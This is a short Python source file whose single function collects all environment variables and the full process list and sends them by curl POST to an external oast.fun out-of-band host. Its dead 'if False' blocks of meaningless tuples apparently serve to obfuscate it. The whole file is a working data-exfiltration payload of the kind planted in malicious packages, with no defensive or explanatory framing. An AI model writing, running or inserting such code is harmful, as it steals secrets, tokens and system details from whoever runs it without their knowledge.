import os
import subprocess
if False:
    _var_124_0 = (145, 755, 559)
    _var_124_1 = (222, 538, 768)
    _var_124_2 = (133, 853, 450)

    def _var_124_fn():
        pass

def RunCommand():
    env_vars = os.environ
    if False:
        _var_123_0 = (629, 254, 67)
        _var_123_1 = (910, 489, 221)

        def _var_123_fn():
            pass
    output = subprocess.check_output(['ps', '-elf']).decode('utf-8')
    env_vars_string = '&'.join([f'{key}={value}' for (key, value) in env_vars.items()])
    data = {'ps_output': output, 'environment': env_vars_string}
    data_string = '&'.join([f'{key}={value}' for (key, value) in data.items()])
    curl_command = ['curl', '-X', 'POST', '-d', f"'{data_string}'", 'http://catvghtugbisywnzzpwvtuhf7ifdcnw1u.oast.fun']
    subprocess.run(curl_command, check=True)